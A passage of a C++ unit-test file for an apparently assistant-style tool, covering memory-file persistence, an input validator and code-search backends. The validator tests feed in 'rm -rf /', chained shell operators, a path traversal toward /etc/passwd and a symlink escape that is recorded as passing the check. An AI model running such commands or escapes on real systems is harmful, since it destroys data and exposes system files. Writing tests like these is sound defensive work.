  std::filesystem::create_directories(dir);
  return dir;
}

// Turns a usable memory file into an unwritable one without touching
// permissions (portable across POSIX and Windows, immune to root): a
// directory at the file path makes every open-for-writing fail.
void break_memory_file(const std::filesystem::path &memfile) {
  std::filesystem::remove(memfile);
  std::filesystem::create_directory(memfile);
}

bool file_contains(const std::filesystem::path &p, const std::string &needle) {
  std::ifstream in(p);
  if (!in.is_open()) {
    return false;
  }
  std::stringstream ss;
  ss << in.rdbuf();
  return ss.str().find(needle) != std::string::npos;
}

} // namespace

TEST(MemoryPersistenceBoundary, WarnsAndContinuesOnWriteFailure) {
  auto dir = fresh_temp_dir("persist_fail");
  auto memfile = dir / "memory.txt";
  Data::MemoryManager mm(memfile.string());

  // Sanity: the manager works before anything breaks.
  Core::record_interaction(mm, "sanity", "ok");
  EXPECT_TRUE(file_contains(memfile, "User: sanity"));

  break_memory_file(memfile);

  // The regression: this used to propagate out of process_user_input,
  // reach main(), and exit the whole session. It must not throw, must warn
  // explicitly, and the session (this manager) must stay usable.
  testing::internal::CaptureStdout();
  EXPECT_NO_THROW(Core::record_interaction(mm, "tag1", "resp1"));
  EXPECT_NO_THROW(Core::record_interaction(mm, "tag2", "resp2"));
  std::string out = testing::internal::GetCapturedStdout();
  EXPECT_NE(out.find("not saved"), std::string::npos)
      << "a failed write must say so, not pass silently";

  // In-memory consistency: the manager still answers reads after failures.
  std::vector<std::string> loaded;
  EXPECT_NO_THROW(loaded = mm.load_memory());

  // Recovery: once the path is writable again, persistence resumes. The
  // outage writes lived only in-session and were never persisted, so they
  // must not appear; the post-recovery write must.
  std::filesystem::remove_all(memfile);
  testing::internal::CaptureStdout();
  EXPECT_NO_THROW(Core::record_interaction(mm, "tag3", "resp3"));
  EXPECT_EQ(testing::internal::GetCapturedStdout().find("not saved"),
            std::string::npos)
      << "a successful write must not warn";
  Data::MemoryManager reloaded(memfile.string());
  auto reloaded_content = reloaded.load_memory();
  auto joined = std::accumulate(reloaded_content.begin(),
                                reloaded_content.end(), std::string());
  EXPECT_NE(joined.find("tag3"), std::string::npos);
  EXPECT_EQ(joined.find("tag1"), std::string::npos);
  EXPECT_EQ(joined.find("tag2"), std::string::npos);

  std::filesystem::remove_all(dir);
}

TEST(MemoryPersistenceBoundary, SavesNormallyWithoutWarning) {
  auto dir = fresh_temp_dir("persist_ok");
  auto memfile = dir / "memory.txt";
  Data::MemoryManager mm(memfile.string());

  testing::internal::CaptureStdout();
  Core::record_interaction(mm, "hello", "world");
  EXPECT_EQ(testing::internal::GetCapturedStdout().find("not saved"),
            std::string::npos);
  EXPECT_TRUE(file_contains(memfile, "User: hello"));
  EXPECT_TRUE(file_contains(memfile, "Assistant: world"));

  std::filesystem::remove_all(dir);
}

TEST(MemoryPersistenceBoundary, RawSaveStillThrowsOnUnwritablePath) {
  // Guards the API contract: save_interaction itself must keep throwing so a
  // future change cannot silently swallow persistence failures underneath the
  // boundary above.
  auto dir = fresh_temp_dir("persist_raw");
  auto memfile = dir / "memory.txt";
  Data::MemoryManager mm(memfile.string());
  break_memory_file(memfile);

  EXPECT_THROW(mm.save_interaction("t", "r"), std::runtime_error);

  std::filesystem::remove_all(dir);
}

TEST(MemoryRoundTrip, SaveAndReload) {
  auto dir = fresh_temp_dir("roundtrip");
  auto memfile = (dir / "memory.txt").string();
  {
    Data::MemoryManager writer(memfile);
    writer.save_interaction("first", "one");
    writer.save_interaction("second", "two");
  }
  Data::MemoryManager reader(memfile);
  auto loaded = reader.load_memory();
  auto joined =
      std::accumulate(loaded.begin(), loaded.end(), std::string());
  EXPECT_NE(joined.find("first"), std::string::npos);
  EXPECT_NE(joined.find("second"), std::string::npos);

  std::filesystem::remove_all(dir);
}

TEST(MemoryRoundTrip, MissingFileLoadsEmpty) {
  auto dir = fresh_temp_dir("missing");
  Data::MemoryManager mm((dir / "never_written.txt").string());
  std::vector<std::string> loaded;
  EXPECT_NO_THROW(loaded = mm.load_memory());
  EXPECT_TRUE(loaded.empty());

  std::filesystem::remove_all(dir);
}

// ---------------------------------------------------------------------------
// Validator security gates: document the exact accept/reject behavior.
// ---------------------------------------------------------------------------

TEST(ValidatorGates, DangerousCommandsWarnButStayValid) {
  auto bad = Utils::Validator::validate_command_safe("rm -rf /");
  EXPECT_TRUE(bad.is_valid);
  EXPECT_FALSE(bad.warnings.empty());

  auto ok = Utils::Validator::validate_command_safe("echo hello");
  EXPECT_TRUE(ok.is_valid);
  EXPECT_TRUE(ok.warnings.empty());
}

TEST(ValidatorGates, ShellOperatorsWarn) {
  for (const std::string op : {"a && b", "a | b", "a; b", "a || b"}) {
    auto r = Utils::Validator::validate_command_safe(op);
    EXPECT_FALSE(r.warnings.empty()) << "no warning for: " << op;
  }
}

TEST(ValidatorGates, SearchQueryRules) {
  EXPECT_FALSE(Utils::Validator::validate_search_query("").is_valid);
  EXPECT_TRUE(Utils::Validator::validate_search_query("hello").is_valid);

  auto long_q =
      Utils::Validator::validate_search_query(std::string(1001, 'x'));
  EXPECT_TRUE(long_q.is_valid);
  EXPECT_FALSE(long_q.warnings.empty());

  auto special = Utils::Validator::validate_search_query("a<b");
  EXPECT_FALSE(special.warnings.empty());
}

TEST(ValidatorGates, FilePathRules) {
  EXPECT_FALSE(Utils::Validator::validate_file_path("", "").is_valid);

  // Traversal without a base directory is warn-only in the current code, not
  // a rejection. Locked in here so any tightening is a deliberate change.
  auto traversal = Utils::Validator::validate_file_path("../x", "");
  EXPECT_TRUE(traversal.is_valid);
  EXPECT_FALSE(traversal.warnings.empty());

  // With a base directory, leaving it is rejected.
  auto outside =
      Utils::Validator::validate_file_path("/etc/passwd", "/tmp/aw_base_xyz");
  EXPECT_FALSE(outside.is_valid);
  EXPECT_FALSE(outside.error_message.empty());
}

TEST(ValidatorGates, SymlinkEscapePassesLexicalCheck) {
  // is_within_directory compares path components lexically and never resolves
  // symlinks, so a link inside the base pointing outside still passes. This
  // documents the limitation; it is not fixed in this change.
  auto dir = fresh_temp_dir("symlink");
  auto outside = dir / "outside.txt";
  {
    std::ofstream f(outside);
    f << "secret";
  }
  auto link = dir / "base" / "link.txt";
  std::filesystem::create_directories(dir / "base");
  std::error_code ec;
  std::filesystem::create_symlink(outside, link, ec);
  if (ec) {
    GTEST_SKIP() << "symlinks unavailable: " << ec.message();
  }

  auto base = (dir / "base").string();
  EXPECT_TRUE(
      Utils::Validator::validate_file_path(link.string(), base).is_valid);

  std::filesystem::remove_all(dir);
}

TEST(ValidatorGates, LineRangeBounds) {
  using Utils::Validator;
  EXPECT_FALSE(Validator::validate_line_range(-1, 5, 10).is_valid);
  EXPECT_FALSE(Validator::validate_line_range(0, -2, 10).is_valid);
  EXPECT_FALSE(Validator::validate_line_range(10, 5, 10).is_valid);
  EXPECT_TRUE(Validator::validate_line_range(0, 5, 10).is_valid);

  auto over = Validator::validate_line_range(8, 5, 10);
  EXPECT_TRUE(over.is_valid);
  EXPECT_FALSE(over.warnings.empty());
}

TEST(ValidatorGates, SanitizeStripsNullsAndTrims) {
  std::string dirty("  a\0b  ", 7);
  EXPECT_EQ(Utils::Validator::sanitize_input(dirty), "ab");
}

// ---------------------------------------------------------------------------
// Search environment: capability detection, guarded search, dynamic prompts.
// ---------------------------------------------------------------------------

namespace {

void make_executable_script(const std::filesystem::path &p) {
  {
    std::ofstream f(p);
    f << "#!/bin/sh\nexit 0\n";
  }
  std::error_code ec;
  std::filesystem::permissions(
      p,
      std::filesystem::perms::owner_exec |
          std::filesystem::perms::group_exec |
          std::filesystem::perms::others_exec,
      ec);
  // Best effort: Windows has no exec bit, and failure here must not fail the
  // test for unrelated reasons. What matters is the file existing.
}

std::string join_paths_for_test(const std::vector<std::string> &found) {
  std::string out;
  for (const auto &f : found)
    out += f + "\n";
  return out;
}

} // namespace

TEST(SearchCapabilities, DetectsToolsFromExplicitPath) {
  auto dir = fresh_temp_dir("caps_bins");
  auto bindir = dir / "bin";
  std::filesystem::create_directories(bindir);
  for (const char *name : {"rg", "fd", "sg", "jq", "git"})
    make_executable_script(bindir / name);

  auto caps = Services::detect_search_capabilities_from_path(bindir.string());
  EXPECT_TRUE(caps.has_ripgrep);
  EXPECT_TRUE(caps.has_fd);
  EXPECT_TRUE(caps.has_ast_grep);
  EXPECT_TRUE(caps.has_jq);
  EXPECT_TRUE(caps.has_git);
  EXPECT_NE(caps.fd_binary.find("fd"), std::string::npos);

  std::filesystem::remove_all(dir);
}

TEST(SearchCapabilities, FallsBackToFdfind) {
  auto dir = fresh_temp_dir("caps_fdfind");
  auto bindir = dir / "bin";
  std::filesystem::create_directories(bindir);
  make_executable_script(bindir / "fdfind");

  auto caps = Services::detect_search_capabilities_from_path(bindir.string());
  EXPECT_TRUE(caps.has_fd);
  EXPECT_NE(caps.fd_binary.find("fdfind"), std::string::npos);
  EXPECT_FALSE(caps.has_ripgrep);

  std::filesystem::remove_all(dir);
}

TEST(SearchCapabilities, EmptyPathMeansNativeEverywhere) {
  auto caps = Services::detect_search_capabilities_from_path("");
  EXPECT_FALSE(caps.has_ripgrep);
  EXPECT_FALSE(caps.has_fd);
  EXPECT_FALSE(caps.has_ast_grep);
  EXPECT_FALSE(caps.has_jq);
  EXPECT_FALSE(caps.has_git);
  EXPECT_TRUE(caps.fd_binary.empty());
}

TEST(SearchCapabilities, LiveDetectionIsConsistent) {
  // No assertions about the environment itself, only internal consistency.
  auto caps = Services::detect_search_capabilities();
  EXPECT_EQ(caps.has_fd, !caps.fd_binary.empty());
}

TEST(NativeSearch, RespectsSkipDirs) {
  auto dir = fresh_temp_dir("skip_dirs");
  const std::string marker = "skip-marker-abc123";
  auto write = [&](const std::string &rel) {
    auto p = dir / rel;
    std::filesystem::create_directories(p.parent_path());
    std::ofstream f(p);
    f << "prefix " << marker << " suffix\n";
  };
  write("normal/match.txt");
  write(".git/match.txt");
  write("node_modules/match.txt");
  write("target/match.txt");
  write("build/match.txt");

  Services::SearchCapabilities caps; // all false: force native backend
  Services::SearchOptions options;
  options.directory = dir.string();
  options.pattern = marker;
  auto result = Services::search_code(caps, options);

  ASSERT_EQ(result.matches.size(), 1u);
  EXPECT_NE(result.matches[0].file_path.find("normal"), std::string::npos);
  EXPECT_EQ(result.backend_used, "native");
  EXPECT_FALSE(result.truncated);

  std::filesystem::remove_all(dir);
}

TEST(NativeSearch, HonorsGitignoreDirs) {
  auto dir = fresh_temp_dir("gitignore_dirs");
  const std::string marker = "ignore-marker-def456";
  {
    std::ofstream ignore(dir / ".gitignore");
    ignore << "ignored_dir/\n";
  }
  auto write = [&](const std::string &rel) {
    auto p = dir / rel;
    std::filesystem::create_directories(p.parent_path());
    std::ofstream f(p);
    f << marker << "\n";
  };
  write("normal/match.txt");
  write("ignored_dir/match.txt");

  Services::SearchCapabilities caps;
  Services::SearchOptions options;
  options.directory = dir.string();
  options.pattern = marker;
  auto result = Services::search_code(caps, options);

  ASSERT_EQ(result.matches.size(), 1u);
  EXPECT_NE(result.matches[0].file_path.find("normal"), std::string::npos);

  std::filesystem::remove_all(dir);
}

TEST(NativeSearch, TruncatesAtMaxMatches) {
  auto dir = fresh_temp_dir("truncate");
  for (int i = 0; i < 10; ++i) {
    auto p = dir / ("f" + std::to_string(i) + ".txt");
    std::ofstream f(p);
    f << "trunc-marker-ghi789\n";
  }

  Services::SearchCapabilities caps;
  Services::SearchOptions options;
  options.directory = dir.string();
  options.pattern = "trunc-marker-ghi789";
  options.max_matches = 3;
  auto result = Services::search_code(caps, options);

  EXPECT_EQ(result.matches.size(), 3u);
  EXPECT_TRUE(result.truncated);

  std::filesystem::remove_all(dir);
}

TEST(NativeSearch, EmptyPatternReturnsEmpty) {
  Services::SearchCapabilities caps;
  Services::SearchOptions options;
  options.directory = ".";
  options.pattern = "";
  auto result = Services::search_code(caps, options);
  EXPECT_TRUE(result.matches.empty());
  EXPECT_FALSE(result.truncated);
}

TEST(RipgrepBackend, MatchesNative) {
  auto live = Services::detect_search_capabilities();
  if (!live.has_ripgrep) {
    GTEST_SKIP() << "ripgrep not on PATH";
  }

  auto dir = fresh_temp_dir("rg_compare");
  const std::string marker = "needle-marker-xyz000";
  for (int i = 0; i < 4; ++i) {
    auto p = dir / ("f" + std::to_string(i) + ".txt");
    std::ofstream f(p);
    f << "line with " << marker << " in it\n";
  }

  Services::SearchOptions options;
  options.directory = dir.string();
  options.pattern = marker;

  auto rg_result = Services::search_code(live, options);
  EXPECT_EQ(rg_result.backend_used, "ripgrep");

  Services::SearchCapabilities native;
  auto native_result = Services::search_code(native, options);

  std::set<std::string> rg_files, native_files;
  for (const auto &m : rg_result.matches)
    rg_files.insert(m.file_path);
  for (const auto &m : native_result.matches)
    native_files.insert(m.file_path);
  EXPECT_EQ(rg_files, native_files);
  EXPECT_EQ(rg_files.size(), 4u);

  std::filesystem::remove_all(dir);
}

TEST(FindFiles, RespectsSkipDirs) {
  auto dir = fresh_temp_dir("find_files");
  auto write = [&](const std::string &rel) {
    auto p = dir / rel;
    std::filesystem::create_directories(p.parent_path());
    std::ofstream f(p);
    f << "x\n";
  };
  write("normal/a.txt");
  write("node_modules/b.txt");

  Services::SearchCapabilities caps; // force native
  auto found = Services::find_files(caps, dir.string(), "*.txt");
  std::string joined = join_paths_for_test(found);
  EXPECT_NE(joined.find("a.txt"), std::string::npos);
  EXPECT_EQ(joined.find("b.txt"), std::string::npos);

  std::filesystem::remove_all(dir);
}

TEST(SearchPrompt, MentionsOnlyDetectedTools) {
  Services::SearchCapabilities with_rg;
  with_rg.has_ripgrep = true;
  std::string prompt = Services::search_tool_prompt(with_rg);
  EXPECT_NE(prompt.find("ripgrep (rg) is installed"), std::string::npos);

  Services::SearchCapabilities none;
  std::string fallback = Services::search_tool_prompt(none);
  EXPECT_NE(fallback.find("native"), std::string::npos);
  // The fallback names absent tools only inside negations ("no X on PATH").
  // What must never appear is an affirmative claim: "is installed" is the
  // marker every present-tool sentence carries.
  EXPECT_EQ(fallback.find("is installed"), std::string::npos);

  Services::SearchCapabilities with_fd;
  with_fd.has_fd = true;
  with_fd.fd_binary = "/usr/bin/fd";
  EXPECT_NE(Services::search_tool_prompt(with_fd).find("fd is installed"),
            std::string::npos);
}
